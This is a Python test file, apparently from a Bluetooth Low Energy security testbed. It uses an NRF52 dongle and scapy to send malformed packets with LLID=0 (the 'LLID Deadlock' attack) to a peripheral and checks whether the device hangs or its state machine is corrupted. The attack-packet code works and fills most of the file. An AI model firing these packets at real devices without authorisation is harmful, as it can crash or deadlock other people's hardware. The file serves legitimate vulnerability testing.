#!/usr/bin/env python

""" Test suite """

from __future__ import print_function
import sys
import unittest
import core.ble as ble
from core.logging_utils import *
from mongodb_database.connect_mongodb import *
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from libs.scapy.layers.bluetooth import SM_Pairing_Response, SM_Hdr, SM_Public_Key
from sql_database.connect import insert_data_to_link_layer_tests

log = logging.getLogger(__name__)


class Test_LL_LLID_DEADLOCK(unittest.TestCase):
    """ Negative Tests for LLID DEADLOCK """

    @classmethod
    def setUpClass(cls):
        c = config.loadConfig()
        attack='LLID Deadlock'
        cls.comPortNRF = c['TESTBED']['COM_PORT_NRF']
        cls.advertiser_address = c['TESTBED']['ADVERTISER_ADDRESS']
        cls.master_address = c['TESTBED']['MASTER_ADDRESS']
        cls.access_address = int(c['TESTBED']['ACCESS_ADDRESS'], 16)
        cls.connection = c['TESTBED']['CONNECTION_TO_DATABASE']
        log.info('Advertiser Address: ' + cls.advertiser_address.upper())
        # Open serial port of NRF52 Dongle
        cls.driver = NRF52Dongle(cls.comPortNRF, '115200')
        date = str(datetime.datetime.today()).split()[0].encode('ascii', 'ignore')

        # Choose from test.conf file  type of database to insert data
        if str(c['TESTBED']['DATABASE_VERSION']) == 'SQL':
            insert_data_to_link_layer_tests(cls.advertiser_address, cls.master_address, cls.access_address, date,
                                            attack, cls.comPortNRF)

        elif str(c['TESTBED']['DATABASE_VERSION']) == 'MONGODB':
            client = insert_data_to_collection_info_tests(attack)
            close_connection_to_database(client)


        elif str(c['TESTBED']['DATABASE_VERSION']) == 'BOTH':
            insert_data_to_link_layer_tests(cls.advertiser_address, cls.master_address, cls.access_address, date,
                                            attack, cls.comPortNRF)
            client = insert_data_to_collection_info_tests(attack)
            close_connection_to_database(client)


        else:
            print('Continue with no database')
            pass

    def setUp(self):
        # Connect to device
        connected = ble.connect(self.driver, self.master_address, self.advertiser_address, self.access_address)
        self.assertTrue(connected, "Failed to connect")

    def tearDown(self):
        ble.disconnect(self.driver)

    @classmethod
    def tearDownClass(cls):
        cls.driver.close()

    def test_link_layer_LL_LLID_DEADLOCK_001(self):

        log.info("Test LLID DEADLOCK ")
        none_count = 0
        # Send feature request
        pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ()
        self.driver.send(pkt)

        while True:
            pkt = None
            # Receive packet from the NRF52 Dongle
            data = self.driver.raw_receive()

            if data:
                # Decode Bluetooth Low Energy Data
                pkt = BTLE(data)
                # if packet is incorrectly decoded, you may not be using the dongle
                if pkt is None:
                    none_count += 1
                    if none_count >= 4:
                        log.error('NRF52 Dongle not detected')
                        sys.exit(0)
                    continue
                elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
                    # Print slave data channel PDUs summary
                    log.debug("Slave RX <--- " + pkt.summary()[7:])

                # --------------- Process Link Layer Packets here ------------------------------------
                if LL_FEATURE_RSP in pkt:
                    pkt = BTLE(access_addr=self.access_address) / BTLE_DATA(LLID=0) / CtrlPDU() / LL_LENGTH_REQ()
                    self.driver.send(pkt)
                    log.info('Malformed packet was sent')
                    log.debug("Attack Packet:\n" + pkt.show(dump=True))
                    time.sleep(1)
                    pulse = ble.check_pulse_via_mtu_exchange(self.driver, self.access_address)
                    self.assertTrue(pulse, "Device did not repsond to provisioning. Presumed dead....")
                    break

        log.info("Test complete")

    def test_link_layer_LL_LLID_DEADLOCK_002(self):

        feature_req_sent = False
        pairing_sent = False
        switch_version_req_llid = False
        none_count = 0
        # Send version indication request
        pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')

        if not switch_version_req_llid:
            switch_version_req_llid = True
        else:
            pkt[BTLE_DATA].LLID = 0
            log.info('Sending version request with LLID = 0')
            switch_version_req_llid = False

        self.driver.send(pkt)  # send normal version request


        while True:


            pkt = None
            # Receive packet from the NRF52 Dongle
            data = self.driver.raw_receive()

            if data:
                # Decode Bluetooth Low Energy Data
                pkt = BTLE(data)
                # if packet is incorrectly decoded, you may not be using the dongle
                if pkt is None:
                    none_count += 1
                    if none_count >= 4:
                        log.error('NRF52 Dongle not detected')
                        sys.exit(0)
                    continue
                elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
                    # Print slave data channel PDUs summary
                    log.debug("Slave RX <--- " + pkt.summary()[7:])

                    # --------------- Process Link Layer Packets here ------------------------------------

                elif LL_VERSION_IND in pkt:
                    # Send Feature request
                    pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ()
                    feature_req_sent = True
                    self.driver.send(pkt)

                elif LL_FEATURE_RSP in pkt:
                    if feature_req_sent:
                        feature_req_sent = False
                        pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
                            max_tx_bytes=251, max_rx_bytes=251)
                        self.driver.send(pkt)

                    else:
                        log.info(
                            'Peripheral replied with a LL_FEATURE_RSP without corresponding request\n'
                            'Peripheral state machine was just corrupted!!!')
                        break

                elif LL_LENGTH_RSP in pkt or LL_UNKNOWN_RSP in pkt:
                    if not pairing_sent:
                        pairing_req = BTLE(
                            access_addr=self.access_address) / BTLE_DATA() / L2CAP_Hdr() / ble.SM_Hdr() / ble.SM_Pairing_Request(
                            iocap=4, oob=0, authentication=0x05, max_key_size=16, initiator_key_distribution=0x07,
                            responder_key_distribution=0x07)

                        if switch_version_req_llid:
                            pairing_req[BTLE_DATA].LLID = 0  # Pairing Request with invalid llid
                            log.info('Sending pairing request with LLID = 0')

                        pairing_sent = True
                        self.driver.send(pairing_req)  # Send pairing request with LLID = 0
                    elif LL_UNKNOWN_RSP not in pkt:
                        log.info(
                            'Peripheral replied with a LL_FEATURE_RSP after we sent a pairing request\n'
                            'Peripheral state machine was just corrupted.')
                        break

                elif ble.ATT_Read_By_Group_Type_Response in pkt or ble.ATT_Exchange_MTU_Response in pkt:
                    log.info("Device responded with an out of order ATT response "
                             "(we didn't send an ATT request)\n"
                             "Peripheral state machine was just corrupted")

                    break

                elif ble.SM_Pairing_Response in pkt:
                    pairing_req = BTLE(
                        access_addr=self.access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Public_Key()
                    self.driver.send(pairing_req)


                elif LL_LENGTH_REQ in pkt:
                    length_rsp = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
                        max_tx_bytes=251, max_rx_bytes=251)
                    self.driver.send(length_rsp)  # Send a normal length response

                elif ble.ATT_Find_By_Type_Value_Request in pkt:
                    pkt = BTLE(
                        access_addr=self.access_address) / BTLE_DATA() / L2CAP_Hdr() / ble.ATT_Hdr() / ble.ATT_Find_By_Type_Value_Response()
                    self.driver.send(pkt)

        log.info('Test Completed')











